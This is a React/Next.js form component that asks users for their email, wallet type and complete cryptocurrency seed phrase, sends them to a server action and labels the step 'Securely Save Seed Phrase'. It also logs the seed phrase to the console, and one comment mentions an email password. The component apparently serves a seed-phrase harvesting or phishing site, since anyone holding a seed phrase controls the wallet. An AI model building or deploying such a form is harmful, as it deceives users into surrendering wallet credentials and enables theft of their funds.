'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { useForm } from 'react-hook-form';
import type * as z from 'zod';
import { seedPhraseSchema, WalletTypes } from '@/lib/definitions';
import type { SeedPhraseFormData } from '@/lib/definitions';
import { Button } from '@/components/ui/button';
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';
import { saveSeedPhraseAction } from '../_actions/save-seed-action'; // Ensure action path is correct
import { useState } from 'react';
import { Loader2, Wallet, Lock } from 'lucide-react'; // Import icons

export function SeedPhraseForm() {
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const form = useForm<SeedPhraseFormData>({
    resolver: zodResolver(seedPhraseSchema),
    defaultValues: {
      email: '',
      walletName: '',
      seedPhrase: '',
      walletType: undefined,
    },
  });

 async function onSubmit(values: SeedPhraseFormData) {
    setIsSubmitting(true);
    console.log("Submitting form values:", values); // Log values before sending

    try {
      // IMPORTANT: DO NOT send the email password from the client-side.
      // If email password is truly needed, it should be handled securely on the backend,
      // potentially during a separate authentication/verification step, not collected here.
      const result = await saveSeedPhraseAction(values);

      console.log("Action result:", result); // Log result from action

      if (result.success) {
        toast({
          title: 'Success!',
          description: 'Your seed phrase has been securely saved.',
        });
        form.reset(); // Reset form on successful submission
      } else {
         console.error("Action error:", result.error);
        toast({
          variant: 'destructive',
          title: 'Error Saving Seed Phrase',
          description: result.error || 'An unexpected error occurred. Please try again.',
        });
      }
    } catch (error) {
      console.error('Form submission error:', error);
       const errorMessage = error instanceof Error ? error.message : 'An unexpected error occurred.';
      toast({
        variant: 'destructive',
        title: 'Submission Failed',
        description: `Could not save seed phrase: ${errorMessage}. Please check the console for details and try again.`,
      });
    } finally {
      setIsSubmitting(false);
    }
  }


  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
        {/* Email */}
        <FormField
          control={form.control}
          name="email"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Your Email</FormLabel>
              <FormControl>
                <Input placeholder="you@example.com" {...field} />
              </FormControl>
              <FormDescription>
                We'll associate this entry with your email.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        {/* Wallet Name/Label */}
        <FormField
          control={form.control}
          name="walletName"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Wallet Name / Label</FormLabel>
              <FormControl>
                <Input placeholder="e.g., My Main Wallet" {...field} />
              </FormControl>
              <FormDescription>A name to help you identify this wallet.</FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        {/* Wallet Type */}
        <FormField
          control={form.control}
          name="walletType"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Wallet Type</FormLabel>
              <Select onValueChange={field.onChange} defaultValue={field.value}>
                <FormControl>
                  <SelectTrigger>
                    <SelectValue placeholder="Select a wallet type" />
                  </SelectTrigger>
                </FormControl>
                <SelectContent>
                  {WalletTypes.map((type) => (
                    <SelectItem key={type} value={type}>
                      {type} {/* Consider adding icons here later */}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <FormDescription>Helps categorize your entry.</FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        {/* Seed Phrase */}
        <FormField
          control={form.control}
          name="seedPhrase"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Seed Phrase</FormLabel>
              <FormControl>
                <Textarea
                  placeholder="Enter your 12, 15, 18, 21, or 24 word seed phrase here..."
                  className="min-h-[100px] resize-none font-mono" // Use mono font for clarity
                  {...field}
                />
              </FormControl>
              <FormDescription>
                Ensure accuracy. Double-check your phrase before saving.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        <Button type="submit" className="w-full bg-accent text-accent-foreground hover:bg-accent/90" disabled={isSubmitting}>
          {isSubmitting ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Saving...
            </>
          ) : (
             <>
               <Lock className="mr-2 h-4 w-4" /> Securely Save Seed Phrase
             </>
          )}
        </Button>
      </form>
    </Form>
  );
}
